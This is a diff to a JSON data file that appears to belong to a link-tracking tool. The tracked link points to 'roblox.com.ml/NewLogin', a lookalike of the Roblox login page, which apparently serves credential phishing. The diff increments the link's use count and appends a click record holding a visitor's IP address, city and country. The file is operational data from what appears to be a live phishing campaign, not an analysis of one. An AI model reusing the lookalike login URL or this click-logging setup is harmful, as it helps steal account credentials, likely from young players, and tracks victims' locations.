@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 47,
+    "useCount": 48,
     "createdBy": "admin",
     "clicks": [
       {
@@ -486,6 +486,14 @@
         "ip": "86.107.55.104",
         "country": "United States",
         "city": "New York",
+        "flag": "🇺🇸",
+        "countryCode": "US"
+      },
+      {
+        "timestamp": 1776871495337,
+        "ip": "66.249.83.8",
+        "country": "United States",
+        "city": "Mountain View",
         "flag": "🇺🇸",
         "countryCode": "US"
       }
